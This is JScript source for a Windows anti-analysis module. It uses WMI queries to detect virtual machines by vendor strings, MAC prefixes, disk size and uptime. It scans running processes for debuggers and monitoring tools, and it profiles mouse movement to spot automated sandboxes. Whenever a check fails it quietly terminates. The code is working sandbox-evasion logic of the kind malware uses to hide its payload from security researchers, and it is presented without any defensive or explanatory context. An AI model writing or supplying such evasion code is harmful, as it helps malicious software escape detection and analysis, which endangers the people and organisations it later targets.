var AdvancedAntiAnalysis = {
    _wmi: new ActiveXObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\\cimv2"),
    
    // Behavioral mouse movement analysis
    analyzeMouseBehavior: function() {
        var points = [];
        var startTime = Date.now();
        var handler = function(e) {
            points.push({
                x: e.screenX,
                y: e.screenY,
                t: Date.now(),
                button: e.button
            });
        };
        document.attachEvent('onmousemove', handler);
        
        var self = this;
        setTimeout(function() {
            document.detachEvent('onmousemove', handler);
            
            if (points.length < 15) {
                self.terminate();
                return;
            }
            
            // Analyze movement patterns
            var totalDistance = 0;
            var hasDirectionChanges = 0;
            var avgSpeed = 0;
            
            for (var i = 1; i < points.length; i++) {
                var dx = points[i].x - points[i-1].x;
                var dy = points[i].y - points[i-1].y;
                var distance = Math.sqrt(dx*dx + dy*dy);
                totalDistance += distance;
                
                if (i > 1) {
                    var prevDx = points[i-1].x - points[i-2].x;
                    var prevDy = points[i-1].y - points[i-2].y;
                    
                    // Check for direction changes (human-like behavior)
                    if ((dx * prevDx < 0) || (dy * prevDy < 0)) {
                        hasDirectionChanges++;
                    }
                }
            }
            
            var totalTime = points[points.length-1].t - points[0].t;
            avgSpeed = totalDistance / (totalTime / 1000);
            
            // Human-like criteria
            if (hasDirectionChanges < 3 || avgSpeed > 500 || totalDistance < 300) {
                self.terminate();
            }
        }, 8000);
    },
    
    // Hardware-based detection
    detectHardware: function() {
        var checks = [
            { query: "SELECT Manufacturer FROM Win32_ComputerSystem", field: "Manufacturer", 
              bad: ["VMware", "VirtualBox", "QEMU", "Bochs", "Parallels"] },
            { query: "SELECT Name FROM Win32_BaseBoard", field: "Name",
              bad: ["Virtual", "VMware", "A M I", "Parallels"] },
            { query: "SELECT Caption FROM Win32_OperatingSystem", field: "Caption",
              bad: ["Hyper-V"] }
        ];
        
        for (var i = 0; i < checks.length; i++) {
            var col = this._wmi.ExecQuery(checks[i].query);
            var e = new Enumerator(col);
            for (; !e.atEnd(); e.moveNext()) {
                var value = e.item()[checks[i].field];
                for (var j = 0; j < checks[i].bad.length; j++) {
                    if (value.indexOf(checks[i].bad[j]) !== -1) {
                        this.terminate();
                    }
                }
            }
        }
    },
    
    // Network-based detection
    detectNetwork: function() {
        var col = this._wmi.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL");
        var e = new Enumerator(col);
        var vmPrefixes = ['08:00:27', '00:0C:29', '00:50:56', '00:05:69', '00:1C:42', '00:03:FF', '02:42:AC'];
        
        for (; !e.atEnd(); e.moveNext()) {
            var mac = e.item().MACAddress.toUpperCase();
            for (var i = 0; i < vmPrefixes.length; i++) {
                if (mac.startsWith(vmPrefixes[i])) this.terminate();
            }
        }
    },
    
    // Process-based detection
    detectProcesses: function() {
        var suspicious = [
            'vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'xenservice', 
            'df5serv', 'wireshark', 'procmon', 'processhacker', 'ollydbg', 
            'windbg', 'fiddler', 'httpdebuggerui', 'wireshark', 'tcpview',
            'autoruns', 'autorunsc', 'filemon', 'procdump', 'regmon', 'sysinternals'
        ];
        
        var col = this._wmi.ExecQuery("SELECT Name FROM Win32_Process");
        var e = new Enumerator(col);
        
        for (; !e.atEnd(); e.moveNext()) {
            var name = e.item().Name.toLowerCase();
            for (var i = 0; i < suspicious.length; i++) {
                if (name.indexOf(suspicious[i]) !== -1) this.terminate();
            }
        }
    },
    
    // Time-based detection
    detectTiming: function() {
        var col = this._wmi.ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem");
        var e = new Enumerator(col);
        
        for (; !e.atEnd(); e.moveNext()) {
            var last = e.item().LastBootUpTime;
            var boot = new Date(
                last.substr(0,4), 
                parseInt(last.substr(4,2))-1, 
                last.substr(6,2),
                last.substr(8,2), 
                last.substr(10,2), 
                last.substr(12,2)
            );
            
            var uptimeMinutes = (Date.now() - boot) / 60000;
            if (uptimeMinutes < 15) this.terminate(); // At least 15 minutes uptime
        }
    },
    
    // Disk size and configuration check
    detectDisk: function() {
        var col = this._wmi.ExecQuery("SELECT Size FROM Win32_LogicalDisk WHERE DriveType=3");
        var totalSize = 0;
        var e = new Enumerator(col);
        
        for (; !e.atEnd(); e.moveNext()) {
            var sizeGb = parseInt(e.item().Size) / 1073741824;
            totalSize += sizeGb;
        }
        
        if (totalSize < 100) this.terminate(); // Require at least 100GB total
    },
    
    terminate: function() {
        // Self-destruct mechanism
        var shell = new ActiveXObject("WScript.Shell");
        try {
            shell.Run("cmd /c ping 127.0.0.1 -n 1 > nul & exit", 0, false);
        } catch(e) {}
        window.close();
    },
    
    runComprehensiveCheck: function() {
        this.detectHardware();
        this.detectNetwork();
        this.detectProcesses();
        this.detectTiming();
        this.detectDisk();
        this.analyzeMouseBehavior();
    }
};

